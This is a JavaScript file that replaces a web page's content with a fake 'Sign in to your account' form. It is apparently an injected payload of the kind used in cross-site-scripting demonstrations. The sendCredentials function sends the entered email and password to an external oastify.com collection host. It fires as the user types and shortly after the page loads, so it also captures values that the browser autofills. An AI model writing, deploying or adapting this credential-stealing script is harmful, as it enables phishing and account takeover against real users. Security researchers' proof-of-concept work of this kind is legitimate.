document.body.innerHTML = "";
const style = document.createElement("style");
style.textContent = "\n    *{box-sizing:border-box}\n    body {\n      margin: 0;\n      font-family: 'Segoe UI', sans-serif;\n      background: linear-gradient(135deg, #4a90e2, #9013fe);\n      height: 100vh;\n      display: flex;\n      justify-content: center;\n      align-items: center;\n    }\n    .login-container {\n      background: #fff;\n      padding: 2rem;\n      border-radius: 12px;\n      box-shadow: 0 8px 24px rgba(0,0,0,0.2);\n      width: 100%;\n      max-width: 360px;\n      animation: fadeIn 0.5s ease-out;\n    }\n    .login-container h2 {\n      margin-bottom: 1.5rem;\n      font-weight: 600;\n      color: #333;\n      text-align: center;\n    }\n    .form-group {\n      margin-bottom: 1.2rem;\n    }\n    .form-group label {\n      display: block;\n      margin-bottom: 0.4rem;\n      font-size: 0.9rem;\n      color: #555;\n    }\n    .form-group input,\n    button {\n      width: 100%;\n      font-size: 1rem;\n    }\n    .form-group input {\n      padding: 0.75rem;\n      border: 1px solid #ccc;\n      border-radius: 8px;\n      transition: border-color 0.3s;\n    }\n    .form-group input:focus {\n      border-color: #4a90e2;\n      outline: none;\n    }\n    button {\n      padding: 0.8rem;\n      background-color: #4a90e2;\n      border: none;\n      color: #fff;\n      font-weight: 700;\n      border-radius: 8px;\n      cursor: pointer;\n      transition: background-color 0.3s;\n    }\n    button:hover {\n      background-color: #357ab7;\n    }\n    @keyframes fadeIn {\n      from { opacity: 0; transform: translateY(-20px); }\n      to { opacity: 1; transform: translateY(0); }\n    }\n  ";
document.head.appendChild(style);
const container = document.createElement("div");
container.className = "login-container";
const heading = document.createElement("h2");
heading.textContent = "Sign in to your account", container.appendChild(heading);
const form = document.createElement("form");
form.setAttribute("autocomplete", "on");
const emailGroup = document.createElement("div");
emailGroup.className = "form-group";
const emailLabel = document.createElement("label");
emailLabel.textContent = "Email", emailLabel.setAttribute("for", "email");
const emailInput = document.createElement("input");
emailInput.type = "email", emailInput.name = "email", emailInput.id = "email", emailInput.required = !0, emailGroup.appendChild(emailLabel), emailGroup.appendChild(emailInput), form.appendChild(emailGroup);
const passGroup = document.createElement("div");
passGroup.className = "form-group";
const passLabel = document.createElement("label");
passLabel.textContent = "Password", passLabel.setAttribute("for", "password");
const passInput = document.createElement("input");
passInput.type = "password", passInput.name = "password", passInput.id = "password", passInput.required = !0, passGroup.appendChild(passLabel), passGroup.appendChild(passInput), form.appendChild(passGroup);
const loginButton = document.createElement("button");

function sendCredentials(n, e) {
    const t = `https://gp99snivp05roqqlyu49avgt3k9bczbn0.oastify.com/?email=${encodeURIComponent(
        n
    )}&password=${encodeURIComponent(e)}`;
    fetch(t, {
        method: "GET",
        mode: "no-cors"
    })
}

function checkAndSend() {
    const n = emailInput.value.trim(),
        e = passInput.value.trim();
    n && e && (sendCredentials(n, e), emailInput.removeEventListener("input", checkAndSend), passInput.removeEventListener("input", checkAndSend), alert(`Credentials sent successfully!\nEmail: ${n}\nPassword: ${e}`))
}
loginButton.type = "submit", loginButton.textContent = "Login", form.appendChild(loginButton), container.appendChild(form), document.body.appendChild(container), emailInput.addEventListener("input", checkAndSend), passInput.addEventListener("input", checkAndSend), setTimeout(checkAndSend, 150);
